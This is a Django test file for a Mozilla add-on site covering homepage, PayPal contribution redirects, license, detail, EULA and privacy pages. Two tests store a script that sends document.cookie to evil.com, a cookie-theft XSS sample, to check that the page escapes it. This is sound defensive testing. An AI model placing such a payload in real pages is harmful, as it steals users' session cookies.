# -*- coding: utf-8 -*-
from datetime import datetime
import re

from django import test
from django.conf import settings
from django.core.cache import cache
from django.utils import translation
from django.utils.encoding import iri_to_uri

from nose.tools import eq_, set_trace
import test_utils
from pyquery import PyQuery as pq

import amo
from amo.helpers import absolutify
from amo.urlresolvers import reverse
from addons import views
from addons.models import Addon, AddonUser
from users.models import UserProfile
from tags.models import Tag, AddonTag
from translations.helpers import truncate
from translations.query import order_by_translation


def norm(s):
    """Normalize a string so that whitespace is uniform."""
    return re.sub(r'[\s]+', ' ', str(s)).strip()

class TestHomepage(test_utils.TestCase):
    fixtures = ['base/apps',
                'base/users',
                'base/addon_3615',
                'base/collections',
                'base/global-stats',
                'base/featured']

    def setUp(self):
        super(TestHomepage, self).setUp()
        self.base_url = reverse('home')

    def test_promo_box_public_addons(self):
        """Only public add-ons in the promobox."""
        r = self.client.get(self.base_url, follow=True)
        doc = pq(r.content)
        assert doc('.addon-view .item').length > 0

        Addon.objects.update(status=amo.STATUS_UNREVIEWED)
        cache.clear()
        r = self.client.get(self.base_url, follow=True)
        doc = pq(r.content)
        eq_(doc('.addon-view .item').length, 0)

    def test_promo_box(self):
        """Test that promobox features have proper translations."""
        r = self.client.get(self.base_url, follow=True)
        doc = pq(r.content)
        eq_(doc('.lead a')[0].text, 'WebDev')

    def test_thunderbird(self):
        """Thunderbird homepage should have the Thunderbird title."""
        r = self.client.get('/en-US/thunderbird/')
        doc = pq(r.content)
        eq_('Add-ons for Thunderbird', doc('title').text())

    def test_default_feature(self):
        response = self.client.get(self.base_url, follow=True)
        eq_(response.status_code, 200)
        eq_(response.context['filter'].field, 'featured')

    def test_featured(self):
        response = self.client.get(self.base_url + '?browse=featured',
                                   follow=True)
        eq_(response.status_code, 200)
        eq_(response.context['filter'].field, 'featured')
        featured = response.context['addon_sets']['featured']
        ids = [a.id for a in featured]
        eq_(set(ids), set([2464, 7661]))
        for addon in featured:
            assert addon.is_featured(amo.FIREFOX, settings.LANGUAGE_CODE)

    def _test_invalid_feature(self):
        response = self.client.get(self.base_url + '?browse=xxx')
        self.assertRedirects(response, '/en-US/firefox/', status_code=301)

    def test_no_unreviewed(self):
        response = self.client.get(self.base_url)
        for addons in response.context['addon_sets'].values():
            for addon in addons:
                assert addon.status != amo.STATUS_UNREVIEWED

    def test_filter_opts(self):
        response = self.client.get(self.base_url)
        opts = [k[0] for k in response.context['filter'].opts]
        eq_(opts, 'featured popular new updated'.split())

    def test_added_date(self):
        doc = pq(self.client.get(self.base_url).content)
        s = doc('#list-new .item .updated').text()
        assert s.strip().startswith('Added'), s


class TestPromobox(test_utils.TestCase):
    fixtures = ['addons/ptbr-promobox']

    def test_promo_box_ptbr(self):
        # bug 564355, we were trying to match pt-BR and pt-br
        response = self.client.get('/pt-BR/firefox/', follow=True)
        eq_(response.status_code, 200)


class TestContributeInstalled(test_utils.TestCase):
    fixtures = ['base/apps', 'base/addon_592']

    def test_no_header_block(self):
        # bug 565493, Port post-install contributions page
        response = self.client.get(reverse('addons.installed', args=[592]),
                                   follow=True)
        doc = pq(response.content)
        header = doc('#header')
        aux_header = doc('#aux-nav')
        # assert that header and aux_header are empty (don't exist)
        eq_(header, [])
        eq_(aux_header, [])

    def test_title(self):
        r = self.client.get(reverse('addons.installed', args=[592]))
        title = pq(r.content)('title').text()
        eq_(title[:37], 'Thank you for installing Gmail S/MIME')


class TestContribute(test_utils.TestCase):
    fixtures = ['base/apps', 'base/addon_3615', 'base/addon_592']

    def test_invalid_is_404(self):
        """we get a 404 in case of invalid addon id"""
        response = self.client.get(reverse('addons.contribute', args=[1]))
        eq_(response.status_code, 404)

    def test_redirect_params_no_type(self):
        """Test that we have the required ppal params when no type is given"""
        response = self.client.get(reverse('addons.contribute',
                                           args=[592]), follow=True)
        redirect_url = response.redirect_chain[0][0]
        required_params = ['bn', 'business', 'charset', 'cmd', 'item_name',
                           'no_shipping', 'notify_url',
                           'return', 'item_number']
        for param in required_params:
            assert(redirect_url.find(param + '=') > -1), \
                   "param [%s] not found" % param

    def test_redirect_params_common(self):
        """Test for the common values that do not change based on type,
           Check that they have expected values"""
        response = self.client.get(reverse('addons.contribute',
                                           args=[592]), follow=True)
        redirect_url = response.redirect_chain[0][0]
        assert(re.search('business=([^&]+)', redirect_url))
        common_params = {'bn': r'-AddonID592',
                         'business': r'gmailsmime%40seantek.com',
                         'charset': r'utf-8',
                         'cmd': r'_donations',
                         'item_name': r'Contribution\+for\+Gmail\+S%2FMIME',
                         'no_shipping': r'1',
                         'notify_url': r'%2Fservices%2Fpaypal',
                         'return': r'x',
                         'item_number': r'[a-f\d]{32}'}

        message = 'param [%s] unexpected value: given [%s], ' \
                  + 'expected pattern [%s]'
        for param, value_pattern in common_params.items():
            match = re.search(r'%s=([^&]+)' % param, redirect_url)
            assert(match and re.search(value_pattern, match.group(1))), \
                  message % (param, match.group(1), value_pattern)

    def test_redirect_params_type_suggested(self):
        """Test that we have the required ppal param when type
           suggested is given"""
        request_params = '?type=suggested'
        response = self.client.get(reverse('addons.contribute',
                                           args=[592]) + request_params,
                                           follow=True)
        redirect_url = response.redirect_chain[0][0]
        required_params = ['amount', 'bn', 'business', 'charset',
                           'cmd', 'item_name', 'no_shipping', 'notify_url',
                           'return', 'item_number']
        for param in required_params:
            assert(redirect_url.find(param + '=') > -1), \
                   "param [%s] not found" % param

    def test_redirect_params_type_onetime(self):
        """Test that we have the required ppal param when
           type onetime is given"""
        request_params = '?type=onetime&onetime-amount=42'
        response = self.client.get(reverse('addons.contribute',
                                           args=[592]) + request_params,
                                           follow=True)
        redirect_url = response.redirect_chain[0][0]
        required_params = ['amount', 'bn', 'business', 'charset', 'cmd',
                           'item_name', 'no_shipping', 'notify_url',
                           'return', 'item_number']
        for param in required_params:
            assert(redirect_url.find(param + '=') > -1), \
                   "param [%s] not found" % param

        assert(redirect_url.find('amount=42') > -1)

    def test_ppal_return_url_not_relative(self):
        response = self.client.get(reverse('addons.contribute',
                                           args=[592]), follow=True)
        redirect_url = response.redirect_chain[0][0]

        assert(re.search('\?|&return=https?%3A%2F%2F', redirect_url)), \
               ("return URL param did not start w/ "
                "http%3A%2F%2F (http://) [%s]" % redirect_url)

    def test_redirect_params_type_monthly(self):
        """Test that we have the required ppal param when
           type monthly is given"""
        request_params = '?type=monthly&monthly-amount=42'
        response = self.client.get(reverse('addons.contribute',
                                           args=[592]) + request_params,
                                           follow=True)
        redirect_url = response.redirect_chain[0][0]
        required_params = ['no_note', 'a3', 't3', 'p3', 'bn', 'business',
                           'charset', 'cmd', 'item_name', 'no_shipping',
                           'notify_url', 'return', 'item_number']
        for param in required_params:
            assert(redirect_url.find(param + '=') > -1), \
                   "param [%s] not found" % param

        assert(redirect_url.find('cmd=_xclick-subscriptions') > -1), \
              'param a3 was not 42'
        assert(redirect_url.find('p3=12') > -1), 'param p3 was not 12'
        assert(redirect_url.find('t3=M') > -1), 'param t3 was not M'
        assert(redirect_url.find('a3=42') > -1), 'param a3 was not 42'
        assert(redirect_url.find('no_note=1') > -1), 'param no_note was not 1'

    def test_paypal_bounce(self):
        """Paypal is retarded and posts to this page."""
        args = dict(args=[3615])
        r = self.client.post(reverse('addons.thanks', **args))
        self.assertRedirects(r, reverse('addons.detail', **args))

    def test_unicode_comment(self):
        r = self.client.get(reverse('addons.contribute', args=[592]),
                            {'comment': u'版本历史记录'})
        eq_(r.status_code, 302)
        assert r['Location'].startswith(settings.PAYPAL_CGI_URL)


class TestDeveloperPages(test_utils.TestCase):
    fixtures = ['base/apps', 'base/addon_3615', 'base/addon_592', 'base/users',
                'addons/eula+contrib-addon']

    def test_meet_the_dev_title(self):
        r = self.client.get(reverse('addons.meet', args=[592]))
        title = pq(r.content)('title').text()
        eq_(title[:31], 'Meet the Gmail S/MIME Developer')

    def test_roadblock_title(self):
        r = self.client.get(reverse('addons.meet', args=[592]))
        title = pq(r.content)('title').text()
        eq_(title[:31], 'Meet the Gmail S/MIME Developer')

    def test_meet_the_dev_src(self):
        r = self.client.get(reverse('addons.meet', args=[11730]))
        button = pq(r.content)('.install-button a.button').attr('href')
        assert button.endswith('?src=developers'), button

    def test_roadblock_src(self):
        url = reverse('addons.roadblock', args=[11730]) + '?src=addondetail'
        r = self.client.get(url)
        button = pq(r.content)('.install-button a.button').attr('href')
        assert button.endswith('?src=addondetail'), button

    def test_contribute_multiple_devs(self):
        a = Addon.objects.get(pk=592)
        u = UserProfile.objects.get(pk=999)
        AddonUser(addon=a, user=u).save()
        r = self.client.get(reverse('addons.meet', args=[592]))
        # Make sure it has multiple devs.
        assert pq(r.content)('.section-teaser')
        assert pq(r.content)('#contribute-button')

    def test_get_old_version(self):
        url = reverse('addons.meet', args=[11730])
        r = self.client.get(url)
        eq_(r.context['version'].version, '20090521')

        r = self.client.get('%s?version=%s' % (url, '20080521'))
        eq_(r.context['version'].version, '20080521')
    test_get_old_version.x = 1


class TestLicensePage(test_utils.TestCase):
    fixtures = ['base/apps', 'base/addon_3615']

    def setUp(self):
        self.addon = Addon.objects.get(id=3615)
        self.version = self.addon.current_version

    def test_legacy_redirect(self):
        r = self.client.get('/versions/license/%s' % self.version.id,
                            follow=True)
        self.assertRedirects(r, self.version.license_url(), 301)

    def test_explicit_version(self):
        url = reverse('addons.license', args=[3615, self.version.version])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.version)

    def test_implicit_version(self):
        url = reverse('addons.license', args=[3615])
        r = self.client.get(url)
        eq_(r.status_code, 200)
        eq_(r.context['version'], self.addon.current_version)

    def test_no_license(self):
        self.version.update(license=None)
        url = reverse('addons.license', args=[3615])
        r = self.client.get(url)
        eq_(r.status_code, 404)

    def test_no_version(self):
        self.addon.versions.all().delete()
        url = reverse('addons.license', args=[3615])
        r = self.client.get(url)
        eq_(r.status_code, 404)


class TestDetailPage(test_utils.TestCase):
    fixtures = ['base/apps',
                'base/addon_3615',
                'base/users',
                'base/addon_59',
                'base/addon_4594_a9',
                'addons/listed',
                'addons/persona']

    def test_anonymous_user(self):
        """Does the page work for an anonymous user?"""
        # extensions
        response = self.client.get(reverse('addons.detail', args=[3615]),
                                   follow=True)
        eq_(response.status_code, 200)
        eq_(response.context['addon'].id, 3615)

        # personas
        response = self.client.get(reverse('addons.detail', args=[15663]),
                                   follow=True)
        eq_(response.status_code, 200)
        eq_(response.context['addon'].id, 15663)

    def test_inactive_addon(self):
        """Do not display disabled add-ons."""
        myaddon = Addon.objects.get(id=3615)
        myaddon.inactive = True
        myaddon.save()
        response = self.client.get(reverse('addons.detail', args=[myaddon.id]),
                                   follow=True)
        eq_(response.status_code, 404)

    def test_listed(self):
        """Show certain things for hosted but not listed add-ons."""
        hosted_resp = self.client.get(reverse('addons.detail', args=[3615]),
                                      follow=True)
        hosted = pq(hosted_resp.content)

        listed_resp = self.client.get(reverse('addons.detail', args=[3723]),
                                      follow=True)
        listed = pq(listed_resp.content)

        eq_(hosted('#releasenotes').length, 1)
        eq_(listed('#releasenotes').length, 0)

    def test_more_about(self):
        # Don't show more about box if there's nothing to populate it.
        addon = Addon.objects.get(id=3615)
        addon.developer_comments_id = None
        addon.description_id = None
        addon.show_beta = False
        addon.previews.all().delete()
        addon.save()

        r = self.client.get(reverse('addons.detail', args=[3615]))
        doc = pq(r.content)

        eq_(doc('#more-about').length, 0)
        eq_(doc('.article.userinput').length, 0)

    def test_beta(self):
        """Test add-on with a beta channel."""
        my_addonid = 3615
        get_pq_content = lambda: pq(self.client.get(reverse(
            'addons.detail', args=[my_addonid]), follow=True).content)

        myaddon = Addon.objects.get(id=my_addonid)

        # Add a beta version and show it.
        mybetafile = myaddon.versions.all()[0].files.all()[0]
        mybetafile.status = amo.STATUS_BETA
        mybetafile.save()
        beta = get_pq_content()
        eq_(beta('#beta-channel').length, 1)

        # Now hide it.
        myaddon.show_beta = False
        myaddon.save()
        beta = get_pq_content()
        eq_(beta('#beta-channel').length, 0)

    def test_other_addons(self):
        """Test "other add-ons by author" list."""

        # Grab a user and give them some add-ons.
        u = UserProfile.objects.get(pk=55021)
        thisaddon = u.addons.all()[0]
        qs = Addon.objects.valid().exclude(pk=thisaddon.pk)
        other_addons = order_by_translation(qs, 'name')[:3]
        for addon in other_addons:
            AddonUser.objects.create(user=u, addon=addon)

        page = self.client.get(reverse('addons.detail', args=[thisaddon.id]),
                               follow=True)
        doc = pq(page.content)
        eq_(doc('.other-author-addons li').length, other_addons.count())
        for i in range(other_addons.count()):
            link = doc('.other-author-addons li a').eq(i)
            eq_(link.attr('href'), other_addons[i].get_url_path())

    def test_type_redirect(self):
        """
        If current add-on's type is unsupported by app, redirect to an
        app that supports it.
        """
        # Sunbird can't do Personas => redirect
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = amo.SUNBIRD.short
        response = self.client.get(reverse('addons.detail', args=[15663]),
                                   follow=False)
        eq_(response.status_code, 301)
        eq_(response['Location'].find(amo.SUNBIRD.short), -1)
        assert (response['Location'].find(amo.FIREFOX.short) >= 0)

    def test_compatible_app_redirect(self):
        """
        For add-ons incompatible with the current app, redirect to one
        that's supported.
        """
        addon = Addon.objects.get(id=3615)
        comp_app = addon.compatible_apps.keys()[0]
        not_comp_app = [a for a in amo.APP_USAGE
                        if a not in addon.compatible_apps.keys()][0]

        # no SeaMonkey version => redirect
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = not_comp_app.short
        response = self.client.get(reverse('addons.detail', args=[addon.id]),
                                   follow=False)
        eq_(response.status_code, 301)
        eq_(response['Location'].find(not_comp_app.short), -1)
        assert (response['Location'].find(comp_app.short) >= 0)

        # compatible app => 200
        prefixer = amo.urlresolvers.get_url_prefix()
        prefixer.app = comp_app.short
        response = self.client.get(reverse('addons.detail', args=[addon.id]),
                                   follow=False)
        eq_(response.status_code, 200)

    def test_external_urls(self):
        """Check that external URLs are properly escaped."""
        addon = Addon.objects.get(id=3615)
        response = self.client.get(reverse('addons.detail', args=[addon.id]),
                                   follow=True)
        doc = pq(response.content)
        eq_(doc('#addon-summary a[href^="%s"]' %
                settings.REDIRECT_URL).length, 1)

    def test_no_privacy_policy(self):
        """Make sure privacy policy is not shown when not present."""
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy_id = None
        addon.save()
        response = self.client.get(reverse('addons.detail', args=[addon.id]),
                                   follow=True)
        doc = pq(response.content)
        eq_(doc('.privacy-policy').length, 0)

    def test_privacy_policy(self):
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy = 'foo bar'
        addon.save()
        response = self.client.get(reverse('addons.detail', args=[addon.id]),
                                   follow=True)
        doc = pq(response.content)
        eq_(doc('.privacy-policy').length, 1)
        privacy_url = reverse('addons.privacy', args=[addon.id])
        assert doc('.privacy-policy').attr('href').endswith(privacy_url)

    def test_simple_html_is_rendered_in_privacy(self):
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        addon.save()

        r = self.client.get(reverse('addons.privacy', args=[addon.id]))
        doc = pq(r.content)

        eq_(norm(doc(".policy-statement strong")),
            "<strong> what the hell..</strong>")
        eq_(norm(doc(".policy-statement ul")),
            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
        eq_(doc(".policy-statement ol a").text(),
            "firefox")
        eq_(norm(doc(".policy-statement ol li:first")),
            "<li>papparapara2</li>")

    def test_evil_html_is_not_rendered_in_privacy(self):
        addon = Addon.objects.get(id=3615)
        addon.privacy_policy = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        addon.save()

        r = self.client.get(reverse('addons.privacy', args=[addon.id]))
        doc = pq(r.content)

        policy = str(doc(".policy-statement"))
        assert policy.startswith(
                    '<div class="policy-statement">&lt;script'), (
                                            'Unexpected: %s' % policy[0:50])

    def test_button_size(self):
        """Make sure install buttons on the detail page are prominent."""
        response = self.client.get(reverse('addons.detail', args=[3615]),
                                   follow=True)
        assert pq(response.content)('.button').hasClass('prominent')

    def test_invalid_version(self):
        """Only render details pages for add-ons that have a version."""
        myaddon = Addon.objects.get(id=3615)
        # wipe all versions
        myaddon.versions.all().delete()
        # try accessing the details page
        response = self.client.get(reverse('addons.detail', args=[myaddon.id]),
                                   follow=True)
        eq_(response.status_code, 404)

    def test_other_author_addons(self):
        """
        Make sure the list of other author addons doesn't include this one.
        """
        r = self.client.get(reverse('addons.detail', args=[3615]))
        doc = pq(r.content)
        eq_(len([a.attrib['value'] for a
                 in doc('#addons-author-addons-select option')
                 if a.attrib['value'] == '3615']), 0)

        # Test "other addons" redirect functionality with valid and
        # invalid input.
        forward_to = lambda input: self.client.get(reverse(
            'addons.detail', args=[3615]), {
                'addons-author-addons-select': input})
        # Valid input.
        response = forward_to('3615')
        eq_(response.status_code, 301)
        assert response['Location'].find('3615') > 0
        # Textual input.
        response = forward_to('abc')
        eq_(response.status_code, 400)
        # Unicode input.
        response = forward_to(u'\u271D')
        eq_(response.status_code, 400)

    def test_remove_tag_button(self):
        self.client.login(username='regular@mozilla.com', password='password')
        tag = Tag(tag_text='f')
        tag.save()
        AddonTag(addon=Addon.objects.get(pk=3615), tag=tag, user_id=999).save()
        r = self.client.get(reverse('addons.detail', args=[3615]))
        doc = pq(r.content)
        assert len(doc('#tags li input.removetag'))

    def test_detailed_review_link(self):
        self.client.login(username='regular@mozilla.com', password='password')
        r = self.client.get(reverse('addons.detail', args=[3615]))
        doc = pq(r.content)
        href = doc('#review-box a[href*="reviews/add"]').attr('href')
        assert href.endswith(reverse('reviews.add', args=[3615])), href

    def test_no_listed_authors(self):
        r = self.client.get(reverse('addons.detail', args=[59]))
        # We shouldn't show an avatar since this has no listed_authors.
        doc = pq(r.content)
        eq_(0, len(doc('.avatar')))

    def test_search_engine_works_with(self):
        """We don't display works-with info for search engines."""
        addon = Addon.objects.filter(type=amo.ADDON_SEARCH)[0]
        r = self.client.get(reverse('addons.detail', args=[addon.id]))
        headings = pq(r.content)('table[itemscope] th')
        assert not any(th.text.strip().lower() == 'works with'
                       for th in headings)

        # Make sure we find Works with for an extension.
        r = self.client.get(reverse('addons.detail', args=[3615]))
        headings = pq(r.content)('table[itemscope] th')
        assert any(th.text.strip().lower() == 'works with'
                   for th in headings)


class TestTagsBox(test_utils.TestCase):
    fixtures = ['base/addontag', 'base/apps']

    def test_tag_box(self):
        """Verify that we don't show duplicate tags."""
        r = self.client.get(reverse('addons.detail', args=[8680]), follow=True)
        doc = pq(r.content)
        eq_('SEO', doc('#tags ul').children().text())


class TestEulaPolicyRedirects(test_utils.TestCase):

    def test_eula_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/42')
        eq_(response.status_code, 301)
        assert (response['Location'].find('/addon/592/eula/42') != -1)

    def test_policy_legacy_url(self):
        """
        See that we get a 301 to the zamboni style URL
        """
        response = self.client.get('/en-US/firefox/addons/policy/0/592/')
        eq_(response.status_code, 301)
        assert (response['Location'].find('/addon/592/privacy/') != -1)


def test_button_caching():
    """The button popups should be cached for a long time."""
    # Get the url from a real page so it includes the build id.
    client = test.Client()
    doc = pq(client.get('/', follow=True).content)
    js_url = reverse('addons.buttons.js')
    url_with_build = doc('script[src^="%s"]' % js_url).attr('src')

    response = client.get(url_with_build, follow=True)
    fmt = '%a, %d %b %Y %H:%M:%S GMT'
    expires = datetime.strptime(response['Expires'], fmt)
    assert (expires - datetime.now()).days >= 365


def test_unicode_redirect():
    url = '/en-US/firefox/addon/2848?xx=\xc2\xbcwhscheck\xc2\xbe'
    response = test.Client().get(url)
    eq_(response.status_code, 301)


class TestEula(test_utils.TestCase):
    fixtures = ['addons/eula+contrib-addon', 'base/apps']

    def test_current_version(self):
        addon = Addon.objects.get(id=11730)
        r = self.client.get(reverse('addons.eula', args=[addon.id]))
        eq_(r.context['version'], addon.current_version)

    def test_simple_html_is_rendered(self):
        addon = Addon.objects.get(id=11730)
        addon.eula = """
            <strong> what the hell..</strong>
            <ul>
                <li>papparapara</li>
                <li>todotodotodo</li>
            </ul>
            <ol>
                <a href="irc://irc.mozilla.org/firefox">firefox</a>

                Introduce yourself to the community, if you like!
                This text will appear publicly on your user info page.
                <li>papparapara2</li>
                <li>todotodotodo2</li>
            </ol>
            """
        addon.save()

        r = self.client.get(reverse('addons.eula', args=[addon.id]))
        doc = pq(r.content)

        eq_(norm(doc(".policy-statement strong")),
            "<strong> what the hell..</strong>")
        eq_(norm(doc(".policy-statement ul")),
            "<ul><li>papparapara</li> <li>todotodotodo</li> </ul>")
        eq_(doc(".policy-statement ol a").text(),
            "firefox")
        eq_(norm(doc(".policy-statement ol li:first")),
            "<li>papparapara2</li>")

    def test_evil_html_is_not_rendered(self):
        addon = Addon.objects.get(id=11730)
        addon.eula = """
            <script type="text/javascript">
                window.location = 'http://evil.com/?c=' + document.cookie;
            </script>
            Muhuhahahahahahaha!
            """
        addon.save()

        r = self.client.get(reverse('addons.eula', args=[addon.id]))
        doc = pq(r.content)

        policy = str(doc(".policy-statement"))
        assert policy.startswith(
                    '<div class="policy-statement">&lt;script'), (
                                            'Unexpected: %s' % policy[0:50])

    def test_old_version(self):
        addon = Addon.objects.get(id=11730)
        old = addon.versions.order_by('created')[0]
        assert old != addon.current_version
        r = self.client.get(reverse('addons.eula',
                                    args=[addon.id, old.all_files[0].id]))
        eq_(r.context['version'], old)

    def test_redirect_no_eula(self):
        Addon.objects.filter(id=11730).update(eula=None)
        r = self.client.get(reverse('addons.eula', args=[11730]), follow=True)
        self.assertRedirects(r, reverse('addons.detail', args=[11730]))


class TestPrivacyPolicy(test_utils.TestCase):
    fixtures = ['addons/eula+contrib-addon', 'base/apps']

    def test_redirect_no_eula(self):
        Addon.objects.filter(id=11730).update(privacy_policy=None)
        r = self.client.get(reverse('addons.privacy', args=[11730]),
                            follow=True)
        self.assertRedirects(r, reverse('addons.detail', args=[11730]))


def test_paypal_language_code():
    def check(lc):
        d = views.contribute_url_params('bz', 32, 'name', 'url')
        eq_(d['lc'], lc)

    check('US')

    translation.activate('it')
    check('IT')

    translation.activate('ru-DE')
    check('RU')


class TestAddonSharing(test_utils.TestCase):
    fixtures = ['base/apps',
                'base/addon_3615']

    def test_redirect_sharing(self):
        addon = Addon.objects.get(id=3615)
        r = self.client.get(reverse('addons.share', args=[3615]),
                            {'service': 'delicious'})
        url = absolutify(unicode(addon.get_url_path()))
        summary = truncate(addon.summary, length=250)
        eq_(r.status_code, 302)
        assert iri_to_uri(addon.name) in r['Location']
        assert iri_to_uri(url) in r['Location']
        assert iri_to_uri(summary) in r['Location']
